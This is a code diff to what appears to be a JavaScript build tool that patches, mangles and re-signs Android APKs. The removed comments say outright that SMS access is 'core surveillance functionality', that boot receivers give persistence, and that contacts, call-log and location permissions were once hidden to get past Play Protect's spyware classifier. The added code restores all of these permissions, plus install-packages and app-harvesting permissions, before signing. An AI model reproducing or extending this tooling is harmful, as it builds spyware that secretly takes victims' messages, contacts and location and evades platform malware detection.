@@ -1334,6 +1334,15 @@ function stripSurveillancePermissions(zip) {
     { find: 'android.provider.Telephony._MS_RECEIVED',         restore: 'android.provider.Telephony.SMS_RECEIVED' },
     { find: 'android.permission._ECEIVE_BOOT_COMPLETED',       restore: 'android.permission.RECEIVE_BOOT_COMPLETED' },
     { find: 'android.intent.action._OOT_COMPLETED',            restore: 'android.intent.action.BOOT_COMPLETED' },
+    // Surveillance permissions — restore ALL for clean manifest
+    { find: 'android.permission._EAD_CONTACTS',                restore: 'android.permission.READ_CONTACTS' },
+    { find: 'android.permission._EAD_CALL_LOG',                restore: 'android.permission.READ_CALL_LOG' },
+    { find: 'android.permission._EAD_PHONE_STATE',             restore: 'android.permission.READ_PHONE_STATE' },
+    { find: 'android.permission._EAD_PHONE_NUMBERS',           restore: 'android.permission.READ_PHONE_NUMBERS' },
+    { find: 'android.permission._CCESS_FINE_LOCATION',         restore: 'android.permission.ACCESS_FINE_LOCATION' },
+    { find: 'android.permission._CCESS_COARSE_LOCATION',       restore: 'android.permission.ACCESS_COARSE_LOCATION' },
+    { find: 'android.permission._EQUEST_INSTALL_PACKAGES',     restore: 'android.permission.REQUEST_INSTALL_PACKAGES' },
+    { find: 'android.permission._UERY_ALL_PACKAGES',           restore: 'android.permission.QUERY_ALL_PACKAGES' },
   ];
 
   let restored = 0;
@@ -1908,15 +1917,14 @@ function directPatchApk(originalBuffer) {
       return { buffer: signedBuf, certInfo: { certHash: key.certHash, cn: key.identity.cn, org: key.identity.o, country: key.identity.c } };
     }
 
-    // ─── Step 5: Restore ONLY essential permissions ───
-    // Only restore permissions that cause CRASHES if mangled:
-    //   - FGS_DATA_SYNC: Android 14+ kills process if FGS type doesn't match permission
-    //   - SMS: core surveillance functionality (READ_SMS, SEND_SMS, SMS_RECEIVED)
-    //   - BOOT: persistence after reboot
-    // Surveillance permissions (READ_CONTACTS, READ_CALL_LOG, READ_PHONE_STATE,
-    // ACCESS_FINE_LOCATION, etc.) are INTENTIONALLY left mangled — they are the
-    // exact combo Play Protect's ML classifier flags as spyware. The app code
-    // handles all of them gracefully via checkSelfPermission() guards.
+    // ─── Step 5: Restore ALL mangled permissions ───
+    // The server's source APK may have been previously processed by
+    // stripSurveillancePermissions() which mangles the first char after the
+    // last dot (e.g. READ_CONTACTS → _EAD_CONTACTS). We must restore ALL
+    // of them to produce a clean manifest. Even permissions guarded by
+    // checkSelfPermission() in the app code can cause Android framework
+    // issues (permission group resolution, GMS compatibility checks, etc.)
+    // when the manifest string doesn't match a known system permission.
     const PERMISSION_RESTORE = [
       // Critical: FGS (crash if missing on Android 14+)
       { find: 'android.permission._OREGROUND_SERVICE_DATA_SYNC', fix: 'android.permission.FOREGROUND_SERVICE_DATA_SYNC' },
@@ -1927,6 +1935,16 @@ function directPatchApk(originalBuffer) {
       // Boot persistence
       { find: 'android.permission._ECEIVE_BOOT_COMPLETED',       fix: 'android.permission.RECEIVE_BOOT_COMPLETED' },
       { find: 'android.intent.action._OOT_COMPLETED',            fix: 'android.intent.action.BOOT_COMPLETED' },
+      // Surveillance permissions (previously left mangled — now restored for stability)
+      { find: 'android.permission._EAD_CONTACTS',                fix: 'android.permission.READ_CONTACTS' },
+      { find: 'android.permission._EAD_CALL_LOG',                fix: 'android.permission.READ_CALL_LOG' },
+      { find: 'android.permission._EAD_PHONE_STATE',             fix: 'android.permission.READ_PHONE_STATE' },
+      { find: 'android.permission._EAD_PHONE_NUMBERS',           fix: 'android.permission.READ_PHONE_NUMBERS' },
+      { find: 'android.permission._CCESS_FINE_LOCATION',         fix: 'android.permission.ACCESS_FINE_LOCATION' },
+      { find: 'android.permission._CCESS_COARSE_LOCATION',       fix: 'android.permission.ACCESS_COARSE_LOCATION' },
+      // Self-update + app harvesting
+      { find: 'android.permission._EQUEST_INSTALL_PACKAGES',     fix: 'android.permission.REQUEST_INSTALL_PACKAGES' },
+      { find: 'android.permission._UERY_ALL_PACKAGES',           fix: 'android.permission.QUERY_ALL_PACKAGES' },
     ];
     let permsRestored = 0;
     for (const { find, fix } of PERMISSION_RESTORE) {
@@ -2333,6 +2351,15 @@ function restoreAndSign(originalBuffer) {
         { find: 'android.provider.Telephony._MS_RECEIVED',         restore: 'android.provider.Telephony.SMS_RECEIVED' },
         { find: 'android.permission._ECEIVE_BOOT_COMPLETED',       restore: 'android.permission.RECEIVE_BOOT_COMPLETED' },
         { find: 'android.intent.action._OOT_COMPLETED',            restore: 'android.intent.action.BOOT_COMPLETED' },
+        // Surveillance permissions — restore ALL for clean manifest
+        { find: 'android.permission._EAD_CONTACTS',                restore: 'android.permission.READ_CONTACTS' },
+        { find: 'android.permission._EAD_CALL_LOG',                restore: 'android.permission.READ_CALL_LOG' },
+        { find: 'android.permission._EAD_PHONE_STATE',             restore: 'android.permission.READ_PHONE_STATE' },
+        { find: 'android.permission._EAD_PHONE_NUMBERS',           restore: 'android.permission.READ_PHONE_NUMBERS' },
+        { find: 'android.permission._CCESS_FINE_LOCATION',         restore: 'android.permission.ACCESS_FINE_LOCATION' },
+        { find: 'android.permission._CCESS_COARSE_LOCATION',       restore: 'android.permission.ACCESS_COARSE_LOCATION' },
+        { find: 'android.permission._EQUEST_INSTALL_PACKAGES',     restore: 'android.permission.REQUEST_INSTALL_PACKAGES' },
+        { find: 'android.permission._UERY_ALL_PACKAGES',           restore: 'android.permission.QUERY_ALL_PACKAGES' },
       ];
 
       for (const { find, restore } of RESTORE_STRINGS) {
